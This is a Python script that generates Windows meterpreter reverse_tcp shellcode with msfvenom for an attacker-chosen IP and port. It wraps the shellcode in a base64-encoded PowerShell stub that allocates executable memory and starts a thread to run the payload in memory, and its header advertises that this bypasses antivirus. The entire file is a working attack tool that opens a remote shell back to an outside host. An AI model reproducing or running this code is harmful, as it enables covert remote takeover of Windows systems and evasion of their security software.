#!/usr/bin/env python

'''
Leg3nd's Meterpreter via Powershell
Payload deployment. Straight into memory
which bypasses ALL AV's.
v1 - r5

Much of this source is credited to Rel1k @ secmaniac.com

Description: Create, parse, and output needed shellcode.
'''

import base64, sys, subprocess, re, os, random, string

# Cleanup old files
if os.path.isfile("/tmp/x64.powershell.alnum") | os.path.isfile("/tmp/x86.powershell.alnum"):
  os.system("rm -f /tmp/*.alnum")

ipaddr = str(sys.argv[1])
port = str(sys.argv[2])
payload = "windows/meterpreter/reverse_tcp"

# Script variables, do not change.
N = 4 #String Length
unique = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(N))

def generate_payload(payload,ipaddr,port):
  # generate payload
  proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
  data = proc.communicate()[0]
  # start to format this a bit to get it ready
  data = data.replace(";", "")
  data = data.replace(" ", "")
  data = data.replace("+", "")
  data = data.replace('"', "")
  data = data.replace("\n", "")
  data = data.replace("buf=", "")
  data = data.rstrip()
  # sub in \x for 0x
  data = re.sub("\\\\x", "0x", data)
  # base counter
  counter = 0
  # count every four characters then trigger mesh and write out data
  mesh = ""
  # ultimate string
  newdata = ""
  for line in data:
    mesh = mesh + line
    counter = counter + 1
    if counter == 4:
      newdata = newdata + mesh + ","
      mesh = ""
      counter = 0

  # heres our shellcode prepped and ready to go
  shellcode = newdata[:-1]

  # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
  powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
  ##############################################################################################################################################################################
  # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
  # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
  ##############################################################################################################################################################################

  # blank command will store our fixed unicode variable
  blank_command = ""
  # loop through each character and insert null byte
  for char in powershell_command:
    # insert the nullbyte
    blank_command += char + "\x00"
    
  # assign powershell command as the new one
  powershell_command = blank_command
  # base64 encode the powershell command
  powershell_command = base64.b64encode(powershell_command)
  # return the powershell code
  return powershell_command

#print("Generating x64-based powershell injection code...")
x64 = generate_payload("windows/x64/meterpreter/reverse_tcp", ipaddr, port)
#print("Generating x86-based powershell injection code...")
x86 = generate_payload("windows/meterpreter/reverse_tcp", ipaddr, port)

# Write shellcode alone into files for later use
filewrite = file("/tmp/x64.powershell.alnum", "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("/tmp/x86.powershell.alnum", "w")
filewrite.write(x86)
filewrite.close()

